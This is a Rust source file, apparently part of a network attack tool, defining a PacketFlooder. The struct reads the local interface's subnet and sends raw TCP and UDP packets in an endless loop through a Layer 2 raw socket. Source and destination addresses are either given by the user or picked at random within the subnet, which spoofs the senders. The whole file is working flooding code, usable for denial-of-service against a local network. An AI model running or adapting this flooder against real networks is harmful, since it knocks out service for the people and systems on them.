use std::net::Ipv4Addr;
use rand::{Rng, rngs::ThreadRng};
use crate::arg_parser::FloodArgs;
use crate::iterators::Ipv4Iter;
use crate::pkt_kit::{PacketBuilder, Layer2RawSocket};
use crate::utils::{iface_network_cidr, inline_display};



pub struct PacketFlooder {
    args:      FloodArgs,
    start:     u32,
    end:       u32,
    pkts_sent: usize,
    rng:       ThreadRng,
}



impl PacketFlooder {

    pub fn new(args: FloodArgs) -> Self {
        Self {
            args,
            start:     0,
            end:       0,
            pkts_sent: 0,
            rng:       rand::thread_rng(),
        }
    }



    pub fn execute(&mut self){
        self.set_ip_range();
        self.send_endlessly();
    }



    fn set_ip_range(&mut self) {
        let cidr         = iface_network_cidr(&self.args.iface);
        let mut ip_range = Ipv4Iter::new(&cidr, None);
        let first_ip     = ip_range.next().expect("No IPs in range");
        let last_ip      = Ipv4Addr::from(u32::from(first_ip) + ip_range.total as u32 - 3);
        self.start       = first_ip.into();
        self.end         = last_ip.into();
    }



    fn setup_tools(iface: String) -> (PacketBuilder, Layer2RawSocket) {
        let pkt_builder = PacketBuilder::new(iface.clone(), None);
        let pkt_sender  = Layer2RawSocket::new(&iface);
        (pkt_builder, pkt_sender)
    }



    fn send_endlessly(&mut self) {
        let (mut pkt_builder, pkt_sender) = Self::setup_tools(self.args.iface.clone());

        loop {
            let src_ip = self.get_src_ip();
            let dst_ip = self.get_dst_ip();
            
            let tcp_pkt = pkt_builder.build_tcp_ether_pkt(src_ip, dst_ip);
            pkt_sender.send_to(tcp_pkt);

            let udp_pkt = pkt_builder.build_udp_ether_pkt(src_ip, dst_ip);
            pkt_sender.send_to(udp_pkt);
            
            self.display_progress();
        }
    }



    fn get_src_ip(&mut self) -> Ipv4Addr {
        self.args.src_ip.unwrap_or_else(|| self.get_random_ip())
    }



    fn get_dst_ip(&mut self) -> Ipv4Addr {
        self.args.dst_ip.unwrap_or_else(|| self.get_random_ip())
    }

    

    fn display_progress(&mut self) {
        self.pkts_sent += 2;
        let msg: String = format!("Packets sent: {}", &self.pkts_sent);
        inline_display(msg);
    }


    fn get_random_ip(&mut self) -> Ipv4Addr {
        let rand_num     = self.rng.gen_range(self.start..=self.end);
        let ip: Ipv4Addr = rand_num.into();
        ip
    }

}